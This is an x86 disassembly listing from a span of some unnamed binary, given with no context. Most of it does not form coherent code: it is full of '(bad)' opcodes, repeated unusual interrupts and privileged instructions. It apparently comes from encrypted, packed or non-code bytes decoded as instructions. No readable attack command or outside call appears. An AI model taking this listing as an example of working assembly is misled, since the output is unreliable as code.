  4259a6:	jbe    0x42594d
  4259a8:	iret   
  4259a9:	jbe    0x425958
  4259ab:	or     dh,BYTE PTR [esi+0xd]
  4259ae:	int    0x76
  4259b0:	or     eax,0x8621d169
  4259b5:	xor    eax,0x37b680c9
  4259ba:	ficom  WORD PTR [ebx]
  4259bc:	or     bh,BYTE PTR [esp+eax*4-0x33]
  4259c0:	(bad)  
  4259c1:	std    
  4259c2:	int    0x96
  4259c4:	std    
  4259c5:	cmp    ecx,DWORD PTR [edi]
  4259c7:	shr    ebx,cl
  4259c9:	xchg   edx,eax
  4259ca:	sar    bh,0x9c
  4259cd:	cmp    esi,ecx
  4259cf:	shr    edx,cl
  4259d1:	sub    BYTE PTR [ebx+0x13],dl
  4259d4:	int    0x96
  4259d6:	std    
  4259d7:	int    0xa6
  4259d9:	std    
  4259da:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4259e0:	popf   
  4259e1:	shl    ebp,cl
  4259e3:	sub    BYTE PTR [ebx-0x2b],dl
  4259e6:	xchg   DWORD PTR [ebx],edx
  4259e8:	int    0x96
  4259ea:	std    
  4259eb:	int    0xa6
  4259ed:	std    
  4259ee:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4259f4:	popf   
  4259f5:	shl    ebp,cl
  4259f7:	sub    BYTE PTR [ebx-0x2b],dl
  4259fa:	xchg   DWORD PTR [ebx],edx
  4259fc:	int    0x96
  4259fe:	std    
  4259ff:	int    0xa6
  425a01:	std    
  425a02:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a08:	popf   
  425a09:	shl    ebp,cl
  425a0b:	sub    BYTE PTR [ebx-0x2b],dl
  425a0e:	xchg   DWORD PTR [ebx],edx
  425a10:	or     cl,bh
  425a12:	nop
  425a13:	add    BYTE PTR [eax],al
  425a15:	add    ch,cl
  425a17:	lea    edi,[ebp+0x3bbd96cd]
  425a1d:	icebp  
  425a1e:	cmp    ecx,DWORD PTR [edi]
  425a20:	shr    edx,cl
  425a22:	sub    bl,dl
  425a24:	jmp    0x4259b8
  425a26:	push   ebx
  425a27:	adc    ecx,ebp
  425a29:	xchg   esi,eax
  425a2a:	mov    ebp,0x3bbda6cd
  425a2f:	cdq    
  425a30:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425a36:	in     eax,0x28
  425a38:	push   ebx
  425a39:	aad    0xa
  425a3b:	int3   
  425a3c:	pop    ss
  425a3d:	aam    0x0
  425a3f:	add    BYTE PTR [eax],al
  425a41:	int    0x8d
  425a43:	dec    esp
  425a44:	int    0x89
  425a46:	int    0x96
  425a48:	std    
  425a49:	int    0xa6
  425a4b:	std    
  425a4c:	int    0x7e
  425a4e:	jo     0x425a8b
  425a50:	popf   
  425a51:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425a57:	in     eax,0x28
  425a59:	push   ebx
  425a5a:	aad    0xa
  425a5c:	int3   
  425a5d:	pop    ss
  425a5e:	aam    0x0
  425a60:	add    BYTE PTR [eax],al
  425a62:	int    0x8d
  425a64:	xor    ch,cl
  425a66:	xchg   esi,eax
  425a67:	xor    BYTE PTR [ebx],bh
  425a69:	icebp  
  425a6a:	cmp    ecx,DWORD PTR [edi]
  425a6c:	shr    edx,cl
  425a6e:	sub    bl,dl
  425a70:	jmp    0x425a04
  425a72:	push   ebx
  425a73:	adc    ecx,ebp
  425a75:	xchg   esi,eax
  425a76:	std    
  425a77:	int    0xa6
  425a79:	std    
  425a7a:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425a80:	cdq    
  425a81:	shl    ebx,cl
  425a83:	xchg   edx,eax
  425a84:	shl    ebp,cl
  425a86:	sub    BYTE PTR [ebx-0x2b],dl
  425a89:	int    0xa6
  425a8b:	std    
  425a8c:	cmp    edi,DWORD PTR [ecx-0x2d]
  425a8f:	mov    ebp,0xfff40492
  425a94:	shl    ebp,cl
  425a96:	sub    BYTE PTR [ebx-0x3b],dl
  425a99:	xchg   ecx,esi
  425a9b:	int    0x76
  425a9d:	adc    al,0xa
  425a9f:	int3   
  425aa0:	pop    ss
  425aa1:	aam    0x0
  425aa3:	add    BYTE PTR [eax],al
  425aa5:	int    0x8d
  425aa7:	adc    al,0x4
  425aa9:	add    bh,bh
  425aab:	shl    edx,cl
  425aad:	sub    BYTE PTR [ebx],bh
  425aaf:	jns    0x425a84
  425ab1:	mov    ebp,0xcdd35392
  425ab6:	(bad)  
  425ab7:	std    
  425ab8:	int    0x96
  425aba:	std    
  425abb:	add    al,0xfb
  425abd:	(bad)  
  425abe:	cmp    ecx,DWORD PTR [edi]
  425ac0:	shr    edx,cl
  425ac2:	sub    bl,dl
  425ac4:	jmp    0x425a58
  425ac6:	push   ebx
  425ac7:	adc    ecx,ebp
  425ac9:	xchg   esi,eax
  425aca:	std    
  425acb:	int    0xa6
  425acd:	std    
  425ace:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425ad4:	repz xchg edx,eax
  425ad6:	shl    ebp,cl
  425ad8:	sub    BYTE PTR [ebx-0x2b],dl
  425adb:	xchg   DWORD PTR [ebx],edx
  425add:	int    0x96
  425adf:	std    
  425ae0:	int    0xa6
  425ae2:	std    
  425ae3:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425ae9:	in     eax,0x28
  425aeb:	shl    ebx,cl
  425aed:	xchg   edx,eax
  425aee:	push   ebx
  425aef:	aad    0x87
  425af1:	adc    ecx,DWORD PTR [edx]
  425af3:	add    eax,0xd4cf
  425af8:	add    bh,cl
  425afa:	push   es
  425afb:	nop
  425afc:	add    BYTE PTR [eax],al
  425afe:	add    BYTE PTR [eax-0x33],dh
  425b01:	jbe    0x425b00
  425b03:	int    0x8d
  425b05:	std    
  425b06:	sar    bh,0x63
  425b09:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b0c:	or     al,0xd3
  425b0e:	mov    ebp,0x28f2d392
  425b13:	push   ebx
  425b14:	shl    DWORD PTR [eax-0x33],cl
  425b17:	jbe    0x425b45
  425b19:	iret   
  425b1a:	or     DWORD PTR [ecx-0x80],eax
  425b1d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425b24:	add    BYTE PTR [eax-0x69ffb000],0x24
  425b2b:	int    0x8d
  425b2d:	push   esp
  425b2e:	or     al,BYTE PTR [ecx-0x32528933]
  425b34:	lea    esi,[ebp-0x6d82bad1]
  425b3a:	shr    ebx,cl
  425b3c:	xchg   edx,eax
  425b3d:	int    0x8d
  425b3f:	lods   eax,DWORD PTR ds:[esi]
  425b40:	int    0x96
  425b42:	mov    ch,0x3b
  425b44:	leave  
  425b45:	cmp    ebx,edx
  425b47:	push   ebx
  425b48:	icebp  
  425b49:	bound  eax,QWORD PTR [eax]
  425b4b:	(bad)  
  425b4c:	xor    al,0xd3
  425b4e:	repnz sub BYTE PTR [eax],al
  425b51:	(bad)  
  425b52:	inc    esp
  425b53:	mov    ebp,0xfb94
  425b58:	int    0x76
  425b5a:	lods   eax,DWORD PTR ds:[esi]
  425b5b:	int    0x8d
  425b5d:	mov    ch,0x2f
  425b5f:	inc    ebp
  425b60:	jge    0x425af4
  425b62:	shr    ebx,cl
  425b64:	xchg   edx,eax
  425b65:	int    0x8d
  425b67:	lods   eax,DWORD PTR ds:[esi]
  425b68:	int    0x96
  425b6a:	mov    ch,0x3b
  425b6c:	leave  
  425b6d:	cmp    ebx,edx
  425b6f:	push   ebx
  425b70:	icebp  
  425b71:	bound  eax,QWORD PTR [eax]
  425b73:	(bad)  
  425b74:	push   esp
  425b75:	shl    edx,cl
  425b77:	sub    BYTE PTR [eax],al
  425b79:	(bad)  
  425b7a:	cmp    al,0xbd
  425b7c:	inc    esp
  425b7d:	sti    
  425b7e:	add    BYTE PTR [eax],al
  425b80:	int    0x76
  425b82:	std    
  425b83:	int    0x8d
  425b85:	std    
  425b86:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425b89:	repnz sub BYTE PTR [ebx],bh
  425b8c:	jns    0x425b61
  425b8e:	mov    ebp,0xcdd35392
  425b93:	(bad)  
  425b94:	std    
  425b95:	int    0x96
  425b97:	std    
  425b98:	cmp    ecx,DWORD PTR [edi]
  425b9a:	shr    ebx,cl
  425b9c:	xchg   edx,eax
  425b9d:	cmp    edx,ebp
  425b9f:	shr    edx,cl
  425ba1:	sub    BYTE PTR [ebx+0x13],dl
  425ba4:	xchg   ebx,edx
  425ba6:	int    0x8d
  425ba8:	std    
  425ba9:	int    0x96
  425bab:	std    
  425bac:	cmp    ecx,DWORD PTR [edi]
  425bae:	shr    ebx,cl
  425bb0:	xchg   edx,eax
  425bb1:	cmp    edx,ebp
  425bb3:	shr    edx,cl
  425bb5:	sub    BYTE PTR [ebx+0x13],dl
  425bb8:	xchg   ebx,edx
  425bba:	int    0x8d
  425bbc:	std    
  425bbd:	int    0x96
  425bbf:	std    
  425bc0:	cmp    ecx,DWORD PTR [edi]
  425bc2:	shr    ebx,cl
  425bc4:	xchg   edx,eax
  425bc5:	cmp    edx,ebp
  425bc7:	shr    edx,cl
  425bc9:	sub    BYTE PTR [ebx+0x13],dl
  425bcc:	xchg   ebx,edx
  425bce:	or     al,BYTE PTR [esi]
  425bd0:	nop
  425bd1:	add    BYTE PTR [eax],al
  425bd3:	add    ch,cl
  425bd5:	jbe    0x425c2b
  425bd7:	int    0x80
  425bd9:	int    0x8d
  425bdb:	mov    ebp,0x3bbd96cd
  425be0:	(bad)  
  425be2:	aad    0xd3
  425be4:	jmp    0x425b78
  425be6:	shr    edx,cl
  425be8:	sub    BYTE PTR [ebx+0x13],dl
  425beb:	or     al,BYTE PTR ds:0xd4cf
  425bf1:	add    ch,cl
  425bf3:	jbe    0x425c41
  425bf5:	int    0x80
  425bf7:	int    0x8d
  425bf9:	std    
  425bfa:	int    0x96
  425bfc:	std    
  425bfd:	cmp    ecx,DWORD PTR [edi]
  425bff:	shr    ebx,cl
  425c01:	xchg   edx,eax
  425c02:	int    0x6c
  425c04:	jo     0x425c41
  425c06:	aad    0xd3
  425c08:	jmp    0xcf05:0xa135328
  425c0f:	aam    0x0
  425c11:	add    BYTE PTR [eax],al
  425c13:	int    0x76
  425c15:	sbb    al,0xcd
  425c17:	lea    ebx,[ebx+edi*1]
  425c1a:	or     al,0xd3
  425c1c:	repnz sub BYTE PTR [ebx],bh
  425c1f:	jns    0x425bf4
  425c21:	mov    ebp,0xcdd35392
  425c26:	(bad)  
  425c27:	std    
  425c28:	int    0x96
  425c2a:	std    
  425c2b:	cmp    edx,ebp
  425c2d:	cmp    ecx,DWORD PTR [edi]
  425c2f:	shr    edx,cl
  425c31:	sub    bl,dl
  425c33:	jmp    0x425bc7
  425c35:	push   ebx
  425c36:	adc    ecx,ebp
  425c38:	xchg   esi,eax
  425c39:	std    
  425c3a:	int    0xa6
  425c3c:	std    
  425c3d:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425c43:	hlt    
  425c44:	call   ebx
  425c46:	in     eax,0x28
  425c48:	push   ebx
  425c49:	aad    0x87
  425c4b:	adc    ecx,DWORD PTR [edx]
  425c4d:	add    eax,0xd4cf
  425c52:	add    ch,cl
  425c54:	jbe    0x425c53
  425c56:	int    0x8d
  425c58:	std    
  425c59:	add    al,0x2
  425c5b:	call   ebx
  425c5d:	repnz sub BYTE PTR [ebx],bh
  425c60:	jns    0x425c35
  425c62:	mov    ebp,0xcdd35392
  425c67:	(bad)  
  425c68:	std    
  425c69:	int    0x96
  425c6b:	std    
  425c6c:	add    al,0xfb
  425c6e:	(bad)  
  425c6f:	cmp    ecx,DWORD PTR [edi]
  425c71:	shr    edx,cl
  425c73:	sub    bl,dl
  425c75:	jmp    0x425c09
  425c77:	push   ebx
  425c78:	adc    eax,DWORD PTR [edi-0x272322d]
  425c7e:	int    0x96
  425c80:	std    
  425c81:	add    al,0xfb
  425c83:	(bad)  
  425c84:	cmp    ecx,DWORD PTR [edi]
  425c86:	shr    edx,cl
  425c88:	sub    bl,dl
  425c8a:	jmp    0x425c1e
  425c8c:	push   ebx
  425c8d:	adc    ecx,edi
  425c8f:	pop    ss
  425c90:	nop
  425c91:	add    BYTE PTR [eax],al
  425c93:	add    BYTE PTR [edx-0x33],ah
  425c96:	xchg   esi,eax
  425c97:	std    
  425c98:	int    0xa6
  425c9a:	std    
  425c9b:	xchg   ebx,edx
  425c9d:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425ca3:	int3   
  425ca4:	push   es
  425ca5:	aam    0x0
  425ca7:	add    BYTE PTR [eax],al
  425ca9:	int    0x76
  425cab:	sub    al,0x4
  425cad:	hlt    
  425cae:	call   ebx
  425cb0:	repz xchg edx,eax
  425cb2:	shl    ebp,cl
  425cb4:	sub    BYTE PTR [ebx-0x2b],dl
  425cb7:	iret   
  425cb8:	or     edi,ebp
  425cba:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425cc1:	add    BYTE PTR [eax+0x50007162],0x0
  425cc8:	xchg   esi,eax
  425cc9:	and    al,0x6
  425ccb:	ins    DWORD PTR es:[edi],dx
  425ccc:	aam    0xbc
  425cce:	int    0x76
  425cd0:	in     eax,dx
  425cd1:	int    0x8d
  425cd3:	adc    DWORD PTR [edi],ebp
  425cd5:	inc    ebp
  425cd6:	jge    0x425c6a
  425cd8:	shr    ebx,cl
  425cda:	xchg   edx,eax
  425cdb:	int    0xe3
  425cdd:	int    0x7d
  425cdf:	int    0x76
  425ce1:	in     eax,dx
  425ce2:	int    0x96
  425ce4:	adc    DWORD PTR [ebx],edi
  425ce6:	fidivr DWORD PTR [ebx]
  425ce8:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425cef:	push   ebx
  425cf0:	adc    ecx,ebp
  425cf2:	xor    BYTE PTR [ebx-0x76],al
  425cf5:	jo     0x425cc4
  425cf7:	xchg   esi,eax
  425cf8:	push   esp
  425cf9:	in     al,dx
  425cfa:	push   esp
  425cfb:	int    0x92
  425cfd:	int    0xa6
  425cff:	push   eax
  425d00:	retf   0x5324
  425d03:	or     DWORD PTR [eax+ecx*4],esp
  425d06:	int    0x76
  425d08:	cmc    
  425d09:	int    0x8d
  425d0b:	stc    
  425d0c:	das    
  425d0d:	inc    ebp
  425d0e:	jge    0x425ca2
  425d10:	shr    ebx,cl
  425d12:	xchg   edx,eax
  425d13:	int    0x8d
  425d15:	cmc    
  425d16:	int    0xa6
  425d18:	stc    
  425d19:	cmp    ecx,ecx
  425d1b:	cmp    ebx,ebp
  425d1d:	shl    edx,cl
  425d1f:	sub    ch,cl
  425d21:	lea    esi,[eax]
  425d23:	push   ebx
  425d24:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425d2a:	int    0x1c
  425d2c:	inc    ebx
  425d2d:	(bad)  
  425d2e:	jo     0x425d3a
  425d30:	lea    esi,[eax]
  425d32:	or     cl,0xec
  425d35:	xchg   ch,cl
  425d37:	xchg   esi,eax
  425d38:	push   esp
  425d39:	int    0x76
  425d3b:	dec    esp
  425d3c:	int    0x4a
  425d3e:	int    0x20
  425d40:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425d46:	sbb    al,0xcd
  425d48:	dec    edx
  425d49:	xchg   ebp,ecx
  425d4b:	sub    eax,0xa808080
  425d50:	lea    esi,[eax]
  425d52:	int    0x4a
  425d54:	int    0xa6
  425d56:	push   eax
  425d57:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425d5e:	int    0x80
  425d60:	int    0x4a
  425d62:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425d66:	jbe    0x425d55
  425d68:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425d6e:	das    
  425d6f:	inc    ebp
  425d70:	jge    0x425d04
  425d72:	shr    ebx,cl
  425d74:	xchg   edx,eax
  425d75:	int    0x8d
  425d77:	in     eax,dx
  425d78:	int    0xa6
  425d7a:	adc    DWORD PTR [ebx],edi
  425d7c:	leave  
  425d7d:	cmp    ebx,ebp
  425d7f:	shl    edx,cl
  425d81:	sub    BYTE PTR [ebx-0x3b],dl
  425d84:	or     dh,BYTE PTR [esi+0x44]
  425d87:	int    0x76
  425d89:	xor    bl,ch
  425d8b:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425d91:	in     eax,dx
  425d92:	int    0x8d
  425d94:	adc    DWORD PTR [edi],ebp
  425d96:	inc    ebp
  425d97:	jge    0x425d2b
  425d99:	shr    ebx,cl
  425d9b:	xchg   edx,eax
  425d9c:	int    0x8d
  425d9e:	in     eax,dx
  425d9f:	int    0xa6
  425da1:	adc    ebx,edx
  425da3:	repnz sub ch,cl
  425da6:	lea    edx,[ebx+edi*1]
  425da9:	leave  
  425daa:	cmp    ebx,ebp
  425dac:	add    al,0xd3
  425dae:	stc    
  425daf:	push   ebx
  425db0:	(bad)
  425db3:	inc    ebx
  425db4:	shr    DWORD PTR [edi],cl
  425db6:	add    al,0xf7
  425db8:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425dc0:	dec    ebx
  425dc1:	mov    BYTE PTR [ebx],dh
  425dc3:	jge    0x425dcf
  425dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425dc6:	xor    al,0xa
  425dc8:	lea    edi,[ecx*8+0x76cdf18d]
  425dcf:	xchg   ebp,eax
  425dd0:	das    
  425dd1:	inc    ebp
  425dd2:	rcl    DWORD PTR [edx-0x326d422d],cl
  425dd8:	jbe    0x425dcb
  425dda:	int    0xa6
  425ddc:	xchg   ebp,eax
  425ddd:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425de3:	cmp    esi,eax
  425de5:	cmp    ebx,ebp
  425de7:	push   ebx
  425de8:	or     al,0xcd
  425dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425deb:	stc    
  425dec:	das    
  425ded:	inc    ebp
  425dee:	popf   
  425def:	xchg   edx,eax
  425df0:	or     dh,BYTE PTR [esi+0x54]
  425df3:	int    0x76
  425df5:	cmc    
  425df6:	push   ecx
  425df7:	out    0x54,al
  425df9:	add    al,0xd3
  425dfb:	dec    edx
  425dfc:	shr    esp,cl
  425dfe:	xchg   edx,eax
  425dff:	int    0xa6
  425e01:	stc    
  425e02:	cmp    ebx,ebp
  425e04:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e0a:	int    0xa6
  425e0c:	cmc    
  425e0d:	int    0x8d
  425e0f:	stc    
  425e10:	das    
  425e11:	inc    ebp
  425e12:	or     al,0x92
  425e14:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e1a:	shr    ebx,cl
  425e1c:	xchg   edx,eax
  425e1d:	int    0x8d
  425e1f:	stc    
  425e20:	cmp    ecx,ebx
  425e22:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425e28:	cmp    esp,ecx
  425e2a:	push   ebx
  425e2b:	fcmovne st,st(5)
  425e2d:	lea    esi,[edi+ebp*1]
  425e30:	mov    ebx,0x2bc53389
  425e35:	ror    ebp,cl
  425e37:	(bad)  
  425e38:	icebp  
  425e39:	or     dh,BYTE PTR [esi+0x54]
  425e3c:	int    0x76
  425e3e:	xchg   ebp,eax
  425e3f:	das    
  425e40:	inc    ebp
  425e41:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e47:	jbe    0x425e3a
  425e49:	int    0xa6
  425e4b:	xchg   ebp,eax
  425e4c:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425e52:	das    
  425e53:	mov    ebx,0xa6020180
  425e58:	cmp    ebx,ebp
  425e5a:	dec    edx
  425e5b:	or     al,0x1
  425e5d:	ror    DWORD PTR [edx-0x2b],cl
  425e60:	mov    ebp,0xbdbfcb3b
  425e65:	or     ah,BYTE PTR [ebx]
  425e67:	and    eax,0x92d3352f
  425e6c:	shr    DWORD PTR [ebp+0x37d65692],cl
  425e72:	ficom  WORD PTR [ebx]
  425e74:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425e77:	fidiv  WORD PTR [edi]
  425e79:	ficom  WORD PTR [ebx]
  425e7b:	(bad)  
  425e7c:	ss inc ebx
  425e7e:	or     al,0xd6
  425e80:	cs int 0x92
  425e83:	int    0x8d
  425e85:	xor    BYTE PTR [edi+0x548dcd81],al
  425e8b:	add    al,0x64
  425e8d:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425e93:	int    0x8d
  425e95:	xor    BYTE PTR [edi-0x7772327f],al
  425e9b:	xchg   DWORD PTR [esi+0x54],esi
  425e9e:	int    0x89
  425ea0:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425eaa:	push   es
  425eab:	and    eax,DWORD PTR [eax]
  425ead:	add    BYTE PTR [eax],al
  425eaf:	in     al,dx
  425eb0:	test   DWORD PTR [edi+0x25230abd],edi
  425eb6:	int    0x76
  425eb8:	adc    al,0x81
  425eba:	jbe    0x425f00
  425ebc:	leave  
  425ebd:	jbe    0x425f2c
  425ebf:	scas   al,BYTE PTR es:[edi]
  425ec0:	aaa    
  425ec1:	ficom  WORD PTR [ebx]
  425ec3:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425ec9:	int    0x8d
  425ecb:	jne    0x425efc
  425ecd:	inc    ebp
  425ece:	jge    0x425e62
  425ed0:	shr    ebx,cl
  425ed2:	xchg   edx,eax
  425ed3:	int    0x8d
  425ed5:	ins    DWORD PTR es:[edi],dx
  425ed6:	int    0xa6
  425ed8:	jne    0x425ead
  425eda:	repnz sub ch,cl
  425edd:	lea    ecx,[ebp+ecx*8-0x77]
  425ee1:	cmp    ecx,ecx
  425ee3:	cmp    ebx,ebp
  425ee5:	push   ebx
  425ee6:	(bad)
  425ee9:	shl    esp,cl
  425eeb:	int    0x8d
  425eed:	inc    esp
  425eee:	inc    ebx
  425eef:	mov    BYTE PTR [edi+0x54],dh
  425ef2:	int    0x76
  425ef4:	xor    BYTE PTR [edi+0x760a1476],al
  425efa:	xor    ch,cl
  425efc:	ins    BYTE PTR es:[edi],dx
  425efd:	test   BYTE PTR [edx],cl
  425eff:	jbe    0x425f15
  425f01:	int    0x76
  425f03:	in     eax,dx
  425f04:	int    0x8d
  425f06:	adc    DWORD PTR [edi],ebp
  425f08:	inc    ebp
  425f09:	jge    0x425e9d
  425f0b:	shr    ebx,cl
  425f0d:	xchg   edx,eax
  425f0e:	int    0x8d
  425f10:	in     eax,dx
  425f11:	int    0xa6
  425f13:	adc    DWORD PTR [ebx],edi
  425f15:	fnstsw WORD PTR [ebx]
  425f17:	leave  
  425f18:	push   ebx
  425f19:	(bad)
  425f1c:	sub    BYTE PTR [esi+0x76],bl
  425f1f:	adc    al,0x2f
  425f21:	push   es
  425f22:	mov    esi,0xcd0000ff
  425f27:	(bad)  
  425f28:	std    
  425f29:	int    0x96
  425f2b:	std    
  425f2c:	cmp    ecx,DWORD PTR [edi]
  425f2e:	shr    ebx,cl
  425f30:	xchg   edx,eax
  425f31:	sar    bh,0x9c
  425f34:	cmp    esi,ecx
  425f36:	shr    edx,cl
  425f38:	sub    BYTE PTR [ebx+0x13],dl
  425f3b:	int    0x96
  425f3d:	std    
  425f3e:	int    0xa6
  425f40:	std    
  425f41:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f47:	popf   
  425f48:	shl    ebp,cl
  425f4a:	sub    BYTE PTR [ebx-0x2b],dl
  425f4d:	xchg   DWORD PTR [ebx],edx
  425f4f:	int    0x96
  425f51:	std    
  425f52:	int    0xa6
  425f54:	std    
  425f55:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f5b:	popf   
  425f5c:	shl    ebp,cl
  425f5e:	sub    BYTE PTR [ebx-0x2b],dl
  425f61:	xchg   DWORD PTR [ebx],edx
  425f63:	int    0x96
  425f65:	std    
  425f66:	int    0xa6
  425f68:	std    
  425f69:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425f6f:	xchg   edx,eax
  425f70:	shl    ebp,cl
  425f72:	sub    BYTE PTR [ebx-0x2b],dl
  425f75:	xchg   DWORD PTR [ebx],edx
  425f77:	or     cl,bh
  425f79:	nop
  425f7a:	add    BYTE PTR [eax],al
  425f7c:	add    ch,cl
  425f7e:	lea    edx,[eax-0x33]
  425f81:	xchg   esi,eax
  425f82:	mov    ebp,0x3bbda6cd
  425f87:	cdq    
  425f88:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425f8e:	in     eax,0x28
  425f90:	push   ebx
  425f91:	aad    0xa
  425f93:	int3   
  425f94:	pop    ss
  425f95:	aam    0x0
  425f97:	add    BYTE PTR [eax],al
  425f99:	int    0x8d
  425f9b:	dec    esp
  425f9c:	int    0x89
  425f9e:	int    0x96
  425fa0:	std    
  425fa1:	int    0xa6
  425fa3:	std    
  425fa4:	int    0x7e
  425fa6:	jo     0x425fe3
  425fa8:	cdq    
  425fa9:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425faf:	in     eax,0x28
  425fb1:	push   ebx
  425fb2:	aad    0xa
  425fb4:	int3   
  425fb5:	pop    ss
  425fb6:	aam    0x0
  425fb8:	add    BYTE PTR [eax],al
  425fba:	int    0x8d
  425fbc:	sbb    al,0xcd
  425fbe:	xchg   esi,eax
  425fbf:	sbb    al,0x3b
  425fc1:	icebp  
  425fc2:	shr    edx,cl
  425fc4:	sub    BYTE PTR [ebx],bh
  425fc6:	psrlq  mm5,mm3
  425fc9:	xchg   edx,eax
  425fca:	push   ebx
  425fcb:	adc    ecx,ebp
  425fcd:	xchg   esi,eax
  425fce:	std    
  425fcf:	int    0xa6
  425fd1:	std    
  425fd2:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425fd8:	cdq    
  425fd9:	shl    ebp,cl
  425fdb:	sub    bl,dl
  425fdd:	repz xchg edx,eax
  425fdf:	push   ebx
  425fe0:	aad    0xcd
  425fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fe3:	std    
  425fe4:	cmp    edi,DWORD PTR [ecx+0x4]
  425fe7:	hlt    
  425fe8:	call   ebx
  425fea:	mov    ebp,0x28e5d392
  425fef:	push   ebx
  425ff0:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  425ff6:	aam    0x0
  425ff8:	add    BYTE PTR [eax],al
  425ffa:	int    0x8d
  425ffc:	std    
  425ffd:	int    0x96
  425fff:	std    
  426000:	cmp    ecx,DWORD PTR [edi]
  426002:	shr    ebx,cl
  426004:	xchg   edx,eax
  426005:	sar    bh,0x9c
  426008:	cmp    esi,ecx
  42600a:	shr    edx,cl
  42600c:	sub    BYTE PTR [ebx+0x13],dl
  42600f:	int    0x96
  426011:	std    
  426012:	int    0xa6
  426014:	std    
  426015:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42601b:	popf   
  42601c:	shl    ebp,cl
  42601e:	sub    BYTE PTR [ebx-0x2b],dl
  426021:	xchg   DWORD PTR [ebx],edx
  426023:	int    0x96
  426025:	std    
  426026:	int    0xa6
  426028:	std    
  426029:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42602f:	popf   
  426030:	shl    ebp,cl
  426032:	sub    BYTE PTR [ebx-0x2b],dl
  426035:	xchg   DWORD PTR [ebx],edx
  426037:	iret   
  426038:	xchg   esi,eax
  426039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42603a:	or     dl,BYTE PTR ds:0xd4cf
  426040:	add    bh,cl
  426042:	iret   
  426043:	nop
  426044:	add    BYTE PTR [eax],al
  426046:	add    BYTE PTR [ecx-0x33],dh
  426049:	(bad)  
  42604a:	std    
  42604b:	int    0x96
  42604d:	std    
  42604e:	cmp    ecx,DWORD PTR [edi]
  426050:	int    0xd6
  426052:	sub    al,0x3b
  426054:	icebp  
  426055:	shr    ebx,cl
  426057:	xchg   edx,eax
  426058:	shr    edx,cl
  42605a:	sub    BYTE PTR [ebx+0x13],dl
  42605d:	jno    0x42602e
  42605f:	pop    es
  426060:	out    dx,eax
  426061:	add    BYTE PTR [eax+0x7cd7080],0x3d
  426068:	add    DWORD PTR [eax+0x500080],0x7cd2496
  426072:	add    DWORD PTR [ecx+0x760a8080],eax
  426078:	dec    esp
  426079:	int    0x76
  42607b:	mov    ch,cl
  42607d:	mov    BYTE PTR [edi-0x72f5b373],al
  426083:	dec    esp
  426084:	int    0x8d
  426086:	cmc    
  426087:	int    0x96
  426089:	stc    
  42608a:	das    
  42608b:	inc    ebp
  42608c:	jecxz  0x426020
  42608e:	shl    ebx,cl
  426090:	xchg   edx,eax
  426091:	int    0x96
  426093:	cmc    
  426094:	int    0xd6
  426096:	stc    
  426097:	cmp    esi,edi
  426099:	shr    edx,cl
  42609b:	sub    ch,cl
  42609d:	xchg   esi,eax
  42609e:	cmc    
  42609f:	cmp    esi,eax
  4260a1:	push   ebx
  4260a2:	bswap  ebp
  4260a4:	(bad)  
  4260a5:	stc    
  4260a6:	das    
  4260a7:	inc    ebp
  4260a8:	sti    
  4260a9:	xchg   edx,eax
  4260aa:	shr    edi,cl
  4260ac:	xchg   edx,eax
  4260ad:	int    0xd6
  4260af:	cmc    
  4260b0:	int    0xa6
  4260b2:	stc    
  4260b3:	cmp    ebx,ecx
  4260b5:	cmp    ebx,ebp
  4260b7:	push   ebx
  4260b8:	aad    0x87
  4260ba:	adc    ecx,ebp
  4260bc:	xchg   esi,eax
  4260bd:	cmc    
  4260be:	sar    DWORD PTR [ecx-0x62932d8],cl
  4260c4:	das    
  4260c5:	inc    ebp
  4260c6:	sti    
  4260c7:	xchg   edx,eax
  4260c8:	shr    edi,cl
  4260ca:	xchg   edx,eax
  4260cb:	int    0xd6
  4260cd:	cmc    
  4260ce:	int    0xa6
  4260d0:	stc    
  4260d1:	cmp    ebx,ecx
  4260d3:	cmp    ebx,ebp
